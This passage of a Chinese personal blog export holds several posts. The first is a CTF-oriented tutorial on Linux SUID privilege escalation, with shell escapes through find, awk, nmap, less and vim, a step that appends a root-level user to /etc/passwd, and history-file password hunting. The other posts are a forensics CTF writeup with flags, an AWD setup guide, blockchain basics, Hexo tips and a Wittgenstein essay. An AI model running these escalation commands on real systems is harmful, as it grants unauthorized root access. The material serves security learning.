+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># /表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line"># -perm 表示搜索随后的权限</span><br><span class="line"># -u = s表示查找root用户拥有的文件</span><br><span class="line"># -type表示我们正在寻找的文件类型</span><br><span class="line"># f 表示常规文件，而不是目录或特殊文件</span><br><span class="line"># 2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line"># &gt;表示重定向</span><br><span class="line"># /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure>
+
+<p>查找如下：</p>
+<img src="屏幕截图 2025-01-27 160340.png" alt="屏幕截图 2025-01-27 160340" style="zoom:80%;">
+
+<p>ls一下看看是否设置了suid权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /usr/bin/su</span><br><span class="line">#查看/usr/bin/su有无suid权限</span><br></pre></td></tr></table></figure>
+
+<p>如果看到确实设置了suid权限，而且属主为root，现在我们就可以利用我们之前提到的suid可执行二进制文件从而进行提权。</p>
+<h2 id="进行提权"><a href="#进行提权" class="headerlink" title="进行提权"></a>进行提权</h2><p><strong>这里的前提都是要有suid权限</strong></p>
+<p>如果之前查找到的<code>usr/bin/find</code>具有root权限，就用find命令进行提权</p>
+<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find filename -exec whoami \; -quit</span><br><span class="line"># root</span><br><span class="line">find filename -exec /bin/sh -p \; -quit</span><br><span class="line"># whoami</span><br><span class="line"># root</span><br><span class="line"></span><br><span class="line"># 这里的filename对应的文件要有suid权限，比如之前看到/usr/bin/su有suid权限这里就是/usr/bin/su</span><br></pre></td></tr></table></figure>
+
+<p>还有一种差不多的提权方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限</span><br><span class="line">touch 1.txt #创建1.txt</span><br><span class="line">/usr/bin/find 1.txt -exec whoami \;</span><br></pre></td></tr></table></figure>
+
+<p>好像也可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /etc/passwd -exec /bin/bash -p \;</span><br></pre></td></tr></table></figure>
+
+<p>如果最后出了个<code>root</code>就说明提权成功了</p>
+<p>同理，不只find命令，有很多赋予suid权限的文件可以达到权限提升的效果(实际上也和rbash逃逸、sudo提权那些获取shell的命令相似)，这里列举几个：</p>
+<table>
+<thead>
+<tr>
+<th align="left">suid文件</th>
+<th align="left">提权命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;bash</td>
+<td align="left">bash -p</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;csh</td>
+<td align="left">csh -b</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;sh</td>
+<td align="left">sh -p</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;ksh</td>
+<td align="left">ksh -p</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;zsh</td>
+<td align="left">zsh</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;find</td>
+<td align="left">find &#x2F;etc&#x2F;passwd -exec &#x2F;bin&#x2F;bash -p ;</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;awk</td>
+<td align="left">awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;man</td>
+<td align="left">!&#x2F;bin&#x2F;bash</td>
+</tr>
+<tr>
+<td align="left">&#x2F;usr&#x2F;bin&#x2F;more</td>
+<td align="left">!&#x2F;bin&#x2F;bash</td>
+</tr>
+</tbody></table>
+<p><strong>利用相关命令均可在这个网站上查询</strong>：<a href="https://gtfobins.github.io/">GTFOBins</a></p>
+<h3 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h3><p>适用版本：nmap2.02至5.21。</p>
+<p>nmap是一个经典的端口扫描工具，当目标主机存在版本在2.02-5.21之间的nmap且os的版本在上面受影响的范围内或更早就可以尝试使用这种方法进行提权。</p>
+<p>首先是进入nmap交互模式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
+
+<p>之后利用命令进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line"></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-more"><a href="#less-more" class="headerlink" title="less&#x2F;more"></a>less&#x2F;more</h3><p>使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用<code>!</code>命令进入shell。</p>
+<p>less与more相似，以less为例</p>
+<p>less是一种查看文件的命令，但是我们也可以利用less进行执行我们的shell命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">less /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>之后进入交互界面，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VISUAL=&quot;/bin/sh -c &#x27;/bin/sh&#x27;&quot; less /etc/profile</span><br><span class="line">v</span><br><span class="line"></span><br><span class="line">less /etc/profile</span><br><span class="line">v:shell</span><br></pre></td></tr></table></figure>
+
+<p>就可以进入交互界面然后写入shell的</p>
+<h3 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h3><p>nano进入shell页面似乎比较简单</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nano</span><br><span class="line">ctrl + R</span><br><span class="line">ctrl + X</span><br><span class="line">#shell</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="cp-mv"><a href="#cp-mv" class="headerlink" title="cp&#x2F;mv"></a>cp&#x2F;mv</h3><p>以cp为例</p>
+<p>主要是利用cp命令覆盖&#x2F;etc&#x2F;passwd从而进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">#qszd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt test testaaa</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh&#x27; &gt;&gt; passwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su - test</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi&#x2F;vim"></a>vi&#x2F;vim</h3><p>vim为例</p>
+<p>首先是一种比较特殊的情况，就是vim被配置了suid权限，所以只有root才能有权限进行读写，这种时候就是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim.tiny /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:!/bin/sh</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="其他提权"><a href="#其他提权" class="headerlink" title="其他提权"></a>其他提权</h1><h2 id="通过查询历史记录从而获得信息泄露的信息"><a href="#通过查询历史记录从而获得信息泄露的信息" class="headerlink" title="通过查询历史记录从而获得信息泄露的信息"></a>通过查询历史记录从而获得信息泄露的信息</h2><p>利用以下命令可以获取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.bash_history</span><br></pre></td></tr></table></figure>
+
+<p>这个命令可以查看当前用户使用过的历史命令</p>
+<p>有可能会得到root登录的密码</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>newstar2024小明同学们复现</title>
+    <url>/2024/12/newstar2024%E5%B0%8F%E6%98%8E%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>主要最近发现自己的取证题目比较薄弱，于是拿小明同学们练练手。</p>
+<h1 id="1-热心助人的小明同学"><a href="#1-热心助人的小明同学" class="headerlink" title="1.热心助人的小明同学"></a><u>1.热心助人的小明同学</u></h1><p>这个很简单，只要装好vol2，然后lsadump看密码就好</p>
+<p>先看操作版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.py -f image.raw imageinfo</span><br></pre></td></tr></table></figure>
+
+<img src="屏幕截图 2024-12-20 140254.png" alt="屏幕截图 2024-12-20 140254" style="zoom:67%;">
+
+<p>看到操作版本是 Win7SP1x86_23418</p>
+<p>然后直接lsadump就好</p>
+<img src="屏幕截图 2024-12-20 140511.png" alt="屏幕截图 2024-12-20 140511" style="zoom:75%;">
+
+<p>密码：ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh（开头的0x48不是密码）</p>
+<p>所以flag：flag{ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh}</p>
+<h1 id="2-擅长音游的小明同学"><a href="#2-擅长音游的小明同学" class="headerlink" title="2.擅长音游的小明同学"></a><u>2.擅长音游的小明同学</u></h1><p>拿到一个chal_fixed.E01文件，使用FTK挂载 （最好用4.2版本的</p>
+<p>在win7那个下面的<code>root/users/desktop</code>可以看到</p>
+<img src="屏幕截图 2025-01-04 210938.png" alt="屏幕截图 2025-01-04 210938" style="zoom:75%;">
+
+<blockquote>
+<p>[!NOTE]</p>
+<p>真相.txt</p>
+<p>真相会不经意间流入日常的点点滴滴……<br>真相在哪里?</p>
+</blockquote>
+<blockquote>
+<p>[!NOTE]</p>
+<p>要开始了呦.txt</p>
+<p>今天舞萌彩框了好开心啊o(<em>￣▽￣</em>)ブ<br>我要把这一刻用照片保存下来<br>不过在拍摄rating变化的瞬间总感觉有什么东西藏进照片里了<br>打开也没发现什么异常，但是体积好像变大了一点<br>是错觉吗？</p>
+</blockquote>
+<p>可以发现跟图片有关，而在照片文件里面找到ColorfulDog.jpg</p>
+<img src="屏幕截图 2025-01-04 211404.png" alt="屏幕截图 2025-01-04 211404" style="zoom:75%;">
+
+<p>没啥思路了binwalk一下（感觉挺正常的</p>
+<p>发现一个txt内容是：</p>
+<p>听好了听好了听好了听好了听好了听好了听好了： 1919年8月10日，世界就此陷落， 陷落的世界都将迎来一场漩涡， 为这个世界带来有关弗拉格尚未知晓的真相。 但发掘真相的道路被加诸混沌的历练 世界的宽高未被正确丈量 当真相被混沌打乱时 真相将不复存在 也许，在世界的重置和轮回中能找到发现真相的方法…… 至此，尘埃落定 至此，一锤定音 #音游# #NewStarcaea# #Misc#</p>
+<p>然后我们挂载这个E01，注意要在FTK上右键加载镜像，进行加载</p>
+<img src="屏幕截图 2025-01-05 132008.png" alt="屏幕截图 2025-01-05 132008" style="zoom:75%;">
+
+<p>使用VM挂载一下，注意要用管理员运行。</p>
+<p>这里要选择UEFI</p>
+<img src="屏幕截图 2025-01-05 132348.png" alt="屏幕截图 2025-01-05 132348" style="zoom:75%;">
+
+<p>挂载出问题了。。。</p>
+<h1 id="3-擅长加密的小明同学"><a href="#3-擅长加密的小明同学" class="headerlink" title="3.擅长加密的小明同学"></a><u>3.擅长加密的小明同学</u></h1><p>拿到了一个vhd和一个君は加密本当に上手だな.zip，解压得到一个raw文件</p>
+<p>vhd双击打开发现要BitLocker解密，我们使用Elcomsoft Forensic Disk Decryptor</p>
+<p>选择<code>decrypt or mount disk / image file of disk\partition</code></p>
+<img src="屏幕截图 2025-01-05 144711.png" alt="屏幕截图 2025-01-05 144711" style="zoom:50%;">
+
+<p>进行恢复，得到key：408320-285065-614779-610940-547107-218229-492195-125422</p>
+<p>输入恢复密钥之后得到了一个flag.7z，解压需要密码。</p>
+<p>7z在密码复杂的情况下几乎不可能被爆破出来，所以我们看raw文件。</p>
+<p>查看操作版本</p>
+<img src="屏幕截图 2025-01-28 161649.png" alt="屏幕截图 2025-01-28 161649" style="zoom:80%;">
+
+<p>查看有什么进程</p>
+<img src="屏幕截图 2025-01-28 161823.png" alt="屏幕截图 2025-01-28 161823" style="zoom:80%;">
+
+<p>看到有一个mspaint.exe（画图进程），我们提取出来，使用 memdump：</p>
+<img src="屏幕截图 2025-01-28 162129.png" alt="屏幕截图 2025-01-28 162129" style="zoom:80%;">
+
+<p>然后改后缀为data，拉入GIMP.</p>
+<p>图像类型选择RGB透明，拉X,Y,Z，最后得到：</p>
+<img src="屏幕截图 2025-01-28 162730.png" alt="屏幕截图 2025-01-28 162730" style="zoom:80%;">
+
+<p>压缩包密码：<code>rxnifbeiyomezpplugho</code></p>
+<p>解压出来得到：flag{5ZCb44Gv5Y+W6K+B5pys5b2T44Gr5LiK5omL}</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>misc</tag>
+        <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>awd初体验</title>
+    <url>/2024/12/awd%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><u>前言</u></h1><p>哎，，再次感到misc果然还是要会点web或者re才行</p>
+<p>这个awd会给你一个服务器需要你ssh连接起来，连起来之后需要tar下html里面的东西，然后查杀漏洞，维护，攻击别人的。</p>
+<h1 id="以bugku的awd为例"><a href="#以bugku的awd为例" class="headerlink" title="以bugku的awd为例"></a><u>以bugku的awd为例</u></h1><p>报名比赛后能得到一些东西，比如ip白名单，账号密码，token，虚拟ip等</p>
+<p>ip白名单——队长加的队员ip</p>
+<p>账号密码——一会连ssh有用（以<code>：</code>分隔）</p>
+<p>token——提交flag时用</p>
+<p>虚拟ip——连ssh，注意端口是2222</p>
+<h2 id="使用Tabby连接"><a href="#使用Tabby连接" class="headerlink" title="使用Tabby连接"></a>使用Tabby连接</h2><p>项目地址： <a href="https://tabby.sh/">https://tabby.sh/</a> 注意要下windows的（tabby基础讲解： <a href="https://blog.csdn.net/weixin_45417821/article/details/122579794?ops_request_misc=%257B%2522request%255Fid%2522%253A%25223a71448c947f5696c8f39480ad809de2%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=3a71448c947f5696c8f39480ad809de2&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122579794-null-null.142%5Ev100%5Epc_search_result_base8&utm_term=tabby&spm=1018.2226.3001.4187">这里</a>）</p>
+<p>打开后点开<code>设置/配置与连接</code></p>
+<img src="屏幕截图 2024-12-20 231606.png" alt="屏幕截图 2024-12-20 231606" style="zoom:75%;">
+
+<p>点击<code>新建/新配置</code>，选择<code>ssh连接</code></p>
+<p>看到一个空白页面，填写：</p>
+<p>名称—主机—端口—用户名—密码</p>
+<p>如下：</p>
+<img src="屏幕截图 2024-12-20 231918.png" alt="屏幕截图 2024-12-20 231918" style="zoom:75%;">
+
+<p>然后点击新建页面旁边的那个框框，再选择刚刚建的ssh就可以开始连接了</p>
+<img src="屏幕截图 2024-12-20 232210.png" alt="屏幕截图 2024-12-20 232210" style="zoom:75%;">
+
+<p>等一会就连接成功了</p>
+<h3 id="SFTP传输工具"><a href="#SFTP传输工具" class="headerlink" title="SFTP传输工具"></a>SFTP传输工具</h3><p>tabby是自带sftp工具的，连接成功后在右上角就能看到</p>
+<p>点开后能弹出服务器上的目录，如果想下载里面的一些东西可以直接点击会出现保存文件的提示，然后保存就行</p>
+<p>如果想上传文件可以直接拖拽文件，也能点右上角的<code>upload</code></p>
+<h3 id="html相关下载——tar命令"><a href="#html相关下载——tar命令" class="headerlink" title="html相关下载——tar命令"></a>html相关下载——tar命令</h3><p>连接成功之后可以打包下载html里的东西了，在<code>var/www/html</code>里。</p>
+<p>但是html是无法直接下的，那怎么办呢？使用<code>tar</code>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -czvf myfolder.tar.gz /var/www/html/*</span><br><span class="line"># 这个命令会打包html里的所有东西</span><br><span class="line">tar -czvf web.tar.gz ./*</span><br><span class="line"># 打包当前目录下所有东西到当前文件夹下</span><br></pre></td></tr></table></figure>
+
+<p>打包完成的东西在<code>home</code>的一个文件夹里（这里是忘了具体在哪了。。）</p>
+<p>然后就能看到一个<code>myfolder.tar.gz</code>或者<code>web.tar.gz</code>，直接点击保存下来就好</p>
+<h3 id="查找漏洞-修改-上传"><a href="#查找漏洞-修改-上传" class="headerlink" title="查找漏洞+修改+上传"></a>查找漏洞+修改+上传</h3><p>保存下来的html文件夹可以用<code>D盾</code>来扫描漏洞，然后找到对应漏洞，修改。</p>
+<p>这里可以直接在tabby上的服务器文件里修改，或者本地修改完再上传到服务器上</p>
+<p>改完漏洞就能加固我们的防御了。</p>
+<h3 id="沙箱跑木马"><a href="#沙箱跑木马" class="headerlink" title="沙箱跑木马"></a>沙箱跑木马</h3><p>我们可以利用在线沙箱来跑恶意代码，顺便让它帮我们分析一下</p>
+<p>安恒云沙箱： <a href="https://sandbox.dbappsecurity.com.cn/">安恒云沙箱-下一代沙箱的领航者</a></p>
+<p>如果是哥斯拉，蚁剑，冰蝎，天蝎，之类的常规工具可以直接分析出来</p>
+]]></content>
+      <categories>
+        <category>AWD</category>
+      </categories>
+      <tags>
+        <tag>awd</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>区块链Blockchain学习</title>
+    <url>/2025/02/%E5%8C%BA%E5%9D%97%E9%93%BEBlockchain%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>怎么现在的misc区块链内容越来越多了，不得不学了</p>
+<h1 id="什么是区块链？"><a href="#什么是区块链？" class="headerlink" title="什么是区块链？"></a>什么是区块链？</h1><p><strong>区块链</strong>（英语：blockchain或block chain）是借由<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>与<a href="https://zh.wikipedia.org/wiki/%E5%85%B1%E8%AD%98%E6%A9%9F%E5%88%B6">共识机制</a>等技术建立与存储庞大交易资料链的<a href="https://zh.wikipedia.org/wiki/%E5%B0%8D%E7%AD%89%E7%B6%B2%E8%B7%AF">点对点</a>网络系统。</p>
+<p><strong>从字面上看：</strong>区块链是由一个个记录着各种信息的小区块链接起来组成的一个链条，类似于我们将一块块砖头叠起来，而且叠起来后是没办法拆掉的，每个砖头上面还写着各种信息，包括：谁叠的，什么时候叠的，砖头用了什么材质等等，这些信息你也没办法修改。</p>
+<p><strong>从计算机上看：</strong>区块链是一种比较特殊的分布式数据库。分布式数据库就是将数据信息单独放在每台计算机，且存储的信息的一致的，如果有一两台计算机坏掉了，信息也不会丢失，你还可以在其他计算机上查看到。</p>
+<p>区块链是一种分布式的，所以它是没有中心点的，信息存储在所有加入到区块链网络的节点当中，节点的数据是同步的。节点可以是一台服务器，笔记本电脑，手机等。</p>
+<p><strong>有没一两句话能说明白区块链的？</strong></p>
+<p>有的。</p>
+<p>麻将作为中国传统的区块链项目，四个矿工一组，先碰撞出13个数字正确哈希值的矿工可以获得记账权并得到奖励。</p>
+<h1 id="基本名词-工具使用"><a href="#基本名词-工具使用" class="headerlink" title="基本名词&amp;&amp;工具使用"></a>基本名词&amp;&amp;工具使用</h1><h2 id="钱包"><a href="#钱包" class="headerlink" title="钱包"></a>钱包</h2><p>顾名思义就是存储钱的钱包</p>
+<p>这里推荐使用MetaMask，chrome浏览器上的一个插件。</p>
+<img src="屏幕截图 2025-02-09 182036.png" alt="屏幕截图 2025-02-09 182036" style="zoom:80%;">
+
+<p>应该也可以使用 imtoken ，手机上的钱包</p>
+<p>注意每个钱包有一个地址，是收款的地址。而且注册账号时会让你记一些<strong>助记词</strong>，用来在忘记密码（私钥）的时候找回密码或钱包。</p>
+<p><strong>切换网络</strong></p>
+<p>在写CTF题目时候可以看比赛题目部署在哪个网路上，可以点击metamask左上角切换网络</p>
+<img src="屏幕截图 2025-02-09 182359.png" alt="屏幕截图 2025-02-09 182359" style="zoom: 50%;">
+
+<p>这个主要看比赛的网路。</p>
+<h3 id="如何获取以太币？"><a href="#如何获取以太币？" class="headerlink" title="如何获取以太币？"></a>如何获取以太币？</h3><p>主要有一些水龙头可以每日拿一点，网上可以搜到</p>
+<p>1.<a href="https://zan.top/faucet">ZAN Faucet - Get Ethereum Testnet and Solana Devnet Tokens</a></p>
+<p>2.<a href="https://www.alchemy.com/faucets/ethereum-sepolia">Ethereum Sepolia Faucet</a></p>
+<h3 id="助记词"><a href="#助记词" class="headerlink" title="助记词"></a>助记词</h3><p>助记词是从建立账户的时候自动生成的，一般是12个或者24个，用来帮助找回密码。</p>
+<p>但是助记词并不是随机生成的，而是有一定的规律的，而且助记词是有范围的，一共2048个</p>
+<p>这里是所有2048个助记词（英文）： <a href="https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt">bips&#x2F;bip-0039&#x2F;english.txt at master · bitcoin&#x2F;bips</a></p>
+<p>如果从题目中拿到的一些助记词可以从这里缩小范围。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Blockchain</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Blockchain</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>blog 为何上传不了图像的解决</title>
+    <url>/2024/11/blog-%E4%B8%BA%E4%BD%95%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%BA%86%E5%9B%BE%E5%83%8F%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
+    <content><![CDATA[<h1 id="前两天我一直困在为何博客上传不了图像"><a href="#前两天我一直困在为何博客上传不了图像" class="headerlink" title="前两天我一直困在为何博客上传不了图像"></a>前两天我一直困在为何博客上传不了图像</h1><h2 id="而现在我似乎找到了解决方法"><a href="#而现在我似乎找到了解决方法" class="headerlink" title="而现在我似乎找到了解决方法"></a>而现在我似乎找到了解决方法</h2><p>首先你要先下了hexo-asset-image</p>
+<p>而且在config.yml里有个post_asset_folder:要为true</p>
+<p>要做到创建新博客时候能在同目录下自动创建同名文件夹，img就可以放在这个文件夹里面</p>
+<p>然后再typora里设置要选择优先<strong>相对路径</strong>（这个很重要</p>
+<p>保证相对路径的时候再插入图片</p>
+<p>插入图片后查看github对应的文件夹下面有没有相应的图片</p>
+<p><em><strong>因为本质上插入的图片引用的是github的路径，如果github对应目录上没有该图片的话自然在博客上显示不出来</strong></em></p>
+<p>然后再</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+<p>三连试试，每试完一遍可以直接去github上看看，<strong>如果没有这个图片的话试试这个</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>
+
+<p>就这四个来回试，直到对应的github文件夹下出现对应图片就可以上传成功了</p>
+<p><img src="11.png" alt="11"></p>
+<p>类似于这样，要在github目录下能看到，<del>而且似乎图片的命名要简单（？</del></p>
+<p>如果还传不上去的话可以缩放图片试试</p>
+<p><del>（猜想：说不定可以直接在github上add file，下次试试）</del></p>
+<p><del>ps：（这是不是图片加载慢的原因？）</del></p>
+]]></content>
+      <tags>
+        <tag>blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>哲学-维特根斯坦</title>
+    <url>/2024/11/%E5%93%B2%E5%AD%A6-%E7%BB%B4%E7%89%B9%E6%A0%B9%E6%96%AF%E5%9D%A6/</url>
+    <content><![CDATA[<h1 id="维特根斯坦：天才与之责任"><a href="#维特根斯坦：天才与之责任" class="headerlink" title="维特根斯坦：天才与之责任"></a>维特根斯坦：天才与之责任</h1><h2 id="0-写在前面"><a href="#0-写在前面" class="headerlink" title="0.写在前面"></a>0.写在前面</h2><p>这个本来是我高中时候做过的关于维特根斯坦的ppt，突然发现就想着把它发到博客上，于是乎就如此了。</p>
+<p>文章的大部分内容摘自《打开：周濂的一百堂西方哲学课》（这个是真好看，又通俗易懂）</p>
+<p>。</p>
+<h2 id="1-生平"><a href="#1-生平" class="headerlink" title="1.生平"></a>1.生平</h2><p><strong>路德维希·维特根斯坦</strong></p>
+<p>二十世纪<u>最伟大</u>的哲学家（没有之一）</p>
+<p>路德维希·维特根斯坦（Ludwig Wittgenstein）是20世纪最重要的哲学家之一，被公认为分析哲学的重要代表。他于1889年出生于奥地利，后来移居英国。维特根斯坦的思想主要围绕着语言、逻辑和意义展开，他的两部重要著作是《逻辑哲学论》和《哲学探讨》。</p>
+<p>在《逻辑哲学论》中，他试图通过逻辑分析语言，揭示哲学问题的本质，并提出了“言语游戏”的概念，强调语言的使用与特定社会活动和上下文相关。</p>
+<p>而在《哲学探讨》中，他的思想有所转变，开始强调语言的多样性和复杂性，强调语言的使用是基于社会实践和交流的。</p>
+<p>维特根斯坦的思想对逻辑学、语言哲学、认知科学等领域都产生了深远影响，他被认为是20世纪哲学最重要的思想家之一，其作品至今仍受到广泛研究和讨论。</p>
+<img src="2.jpg" alt="2" style="zoom:50%;">
+
+
+
+<h2 id="2-早期维特根斯坦——《逻辑哲学论》"><a href="#2-早期维特根斯坦——《逻辑哲学论》" class="headerlink" title="2.早期维特根斯坦——《逻辑哲学论》"></a>2.早期维特根斯坦——《逻辑哲学论》</h2><p><strong>全书共分七个章节，章节之间或并列或递进。</strong></p>
+<p><strong>全书的主旨要义在于将能<u>“说”</u>的都说清楚</strong></p>
+<h3 id="图像理论：-语言与世界具有相同的逻辑形式"><a href="#图像理论：-语言与世界具有相同的逻辑形式" class="headerlink" title="图像理论： 语言与世界具有相同的逻辑形式"></a>图像理论： 语言与世界具有相同的逻辑形式</h3><p>接下来我们介绍一下著名的“图像理论”， 这是理解《逻辑哲学论》的关键所在。“一战”期间， 维特根斯坦偶然读到一篇文章，报道了巴黎交通法院的判案过程， 在裁决汽车事故时， 法官经常用玩具模型来模拟现场发生的一切。读到这里，维特根斯坦灵光一现，意识到模型发挥的作用与命题是一样的， 都是在刻画和表现现实世界里的事实。也就是说， 语言和世界存在着对应关系。打个比方，当我们说“一辆轿车在左转时与迎面而来的卡车相撞”， 这句话与现场发生的车祸具备逻辑上的同构性，用维特根斯坦的原话说就是：“语言与世界具有通过图像映示关系相联系的平行结构。”</p>
+<p>在“4.014”节中， 维特根斯坦说：“唱片、音乐主题、乐谱和音波之间的关系正同语言与世界之间的内在描绘关系一样。它们都是按照一个共同的逻辑图样构造出来的。”</p>
+<h3 id="逻辑同构性"><a href="#逻辑同构性" class="headerlink" title="逻辑同构性"></a>逻辑同构性</h3><p>维特根斯坦认为，语言与世界之间同样存在着逻辑同构性——复合语句对应着复合事态， 原子语句对应着原子事实， 名称对应着简单对象。而复合语句、原子语句与名称彼此之间则是一个充分分析直到最终无法分析的关系。同样， 复合事态、原子事实和简单对象之间也是这样的关系。</p>
+<p><img src="3.png" alt="3"></p>
+<h3 id="说到这里，-我们可以再做一个小结："><a href="#说到这里，-我们可以再做一个小结：" class="headerlink" title="说到这里， 我们可以再做一个小结："></a>说到这里， 我们可以再做一个小结：</h3><p>首先， 乍看上去， 维特根斯坦是在主张某种符合论的观点，也就是语言反映事实， 就像镜子反映世界。但实际上他的观点要比符合论更神秘， 他认为语言和事实具有某种逻辑的同构性， 用维特根斯坦的话说就是具有相同的“逻辑形式”。</p>
+<p>其次， 维特根斯坦在这里体现出一种充分分析的态度。我刚才说了， 任何复合的语句都可以充分分析成最小单位也即名称，同样，任何复合的事态都可以充分分析成最小单位也即简单对象。</p>
+<h3 id="无法说出的逻辑形式"><a href="#无法说出的逻辑形式" class="headerlink" title="无法说出的逻辑形式"></a>无法说出的逻辑形式</h3><p>那么究竟什么叫作逻辑形式? 这又是一个非常难以理解的概念， 虽然就乐谱和琴声的例子而言， 我们可以体会到二者之间存在着某种共同的逻辑形式， 但是这种逻辑形式到底是什么， 似乎依旧无法给出进一步的说明。事实上， 维特根斯坦就是这样认为的，在他看来， 逻辑形式只能显现， 无法说出</p>
+<h3 id="《逻辑哲学论》中不可说的神秘之物"><a href="#《逻辑哲学论》中不可说的神秘之物" class="headerlink" title="《逻辑哲学论》中不可说的神秘之物"></a>《逻辑哲学论》中不可说的神秘之物</h3><p> 在《逻辑哲学论》这本书中，存在着很多只能显现但不能说出的神秘之物。借助陈嘉映的总结，这些不可说的东西包括： 逻辑形式，哲学问题， 伦理学、美学等学科， 以及包括以上三类在内的所有神秘的东西。</p>
+<p> 为什么这些东西是不可说的? 不可说的东西就是不重要的吗?对此最简单的回答就是， 它们之所以不可说， 是因为它们不是实证科学， 它们谈论的是事实之外的东西。但是这绝不意味着不可说的东西是不重要的， 恰恰相反， 维特根斯坦曾经说过， 那些在《逻辑哲学论》中没有正面处理的内容， 比方说美、生活的意义、死亡，等等， 恰恰是最重要的。</p>
